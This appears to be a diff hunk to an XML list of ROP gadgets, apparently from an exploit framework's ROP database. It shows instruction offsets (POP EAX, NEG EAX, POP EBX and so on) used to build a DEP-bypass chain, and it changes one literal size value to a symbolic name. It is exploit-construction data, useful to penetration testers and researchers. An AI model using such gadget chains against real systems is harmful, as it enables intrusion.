@@ -9,7 +9,7 @@
 		<gadget offset="0x00024c66">POP EBP # RETN</gadget>
 		<gadget offset="0x00024c66">skip 4 bytes</gadget>
 		<gadget offset="0x00004edc">POP EAX # RETN</gadget>
-		<gadget value="FFFFFBFF">0x00000201</gadget>
+		<gadget value="safe_negate_size">0x00000201</gadget>
 		<gadget offset="0x00011e05">NEG EAX # RETN</gadget>
 		<gadget offset="0x000136e3">POP EBX # RETN</gadget>
 		<gadget value="0xffffffff"></gadget>
